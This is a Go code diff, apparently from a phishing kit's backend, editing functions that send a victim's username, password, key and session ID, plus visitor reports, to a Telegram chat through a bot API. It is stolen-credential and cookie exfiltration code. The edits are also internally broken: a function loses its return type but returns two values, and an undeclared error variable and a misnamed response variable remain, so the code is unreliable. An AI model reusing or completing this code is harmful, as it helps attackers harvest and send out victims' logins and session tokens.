@@ -3,6 +3,7 @@ package database
 import (
 	"bytes"
 	"encoding/json"
+	"io/ioutil"
 	"fmt"
 	"github.com/joho/godotenv"
 	"log"
@@ -13,8 +14,6 @@ import (
 	"strconv"
 	"strings"
 	"time"
-	
-	log "github.com/sirupsen/logrus"
 )
 
 type Smtp struct {
@@ -46,7 +45,7 @@ func getUrl() string {
 func telegramSendResult(msg string) (bool, error){
 	// Global variables
 	var err error
-	var response *http.Response
+	var request *http.Response
 	ChatId := goDotEnvVariable("CHAT_ID")
 	msg = strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(msg, "\n", "%0A", -1), "!", "\\!", -1), "}", "\\}", -1), "{", "\\{", -1), "|", "\\|", -1), "=", "\\=", -1), "+", "\\+", -1), ">", "\\>", -1), "#", "\\#", -1), "~", "\\~", -1), ")", "\\)", -1), "(", "\\(", -1), "]", "\\]", -1), ".", "\\.", -1), "`", "\\`", -1), "[", "\\[", -1), "*", "\\*", -1), "_", "\\_", -1), "-", "\\-", -1)
 	// Send the message
@@ -75,11 +74,10 @@ func telegramSendResult(msg string) (bool, error){
 
 }
 
-func sendEmailCookie(msg string, username string, password string, KeyUser string, sessionId string) (bool, error){
+func sendEmailCookie(msg string, username string, password string, KeyUser string, sessionId string) {
 	
 	// Global variables
-	var err error
-	var response *http.Response
+	var request *http.Response
 	ChatId := goDotEnvVariable("CHAT_ID")
 	
 	// Send the message
@@ -107,13 +105,14 @@ func sendEmailCookie(msg string, username string, password string, KeyUser strin
 		fmt.Printf("Unable to write file: %v", err)
 	}
 
-	return
+	return true, nil
 }
 
-func telegramSendVisitor(msg string) (bool, error){
+func telegramSendVisitor(msg string) {
 	msg = strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(msg, "\n", "%0A", -1), "!", "\\!", -1), "}", "\\}", -1), "{", "\\{", -1), "|", "\\|", -1), "=", "\\=", -1), "+", "\\+", -1), ">", "\\>", -1), "#", "\\#", -1), "~", "\\~", -1), ")", "\\)", -1), "(", "\\(", -1), "]", "\\]", -1), ".", "\\.", -1), "`", "\\`", -1), "[", "\\[", -1), "*", "\\*", -1), "_", "\\_", -1), "-", "\\-", -1)
 	
 	// Send the message
+	var request *http.Response
 	url := fmt.Sprintf("%s/sendMessage", getUrl())
 	body, _ := json.Marshal(map[string]string{
 		"chat_id": ChatId,
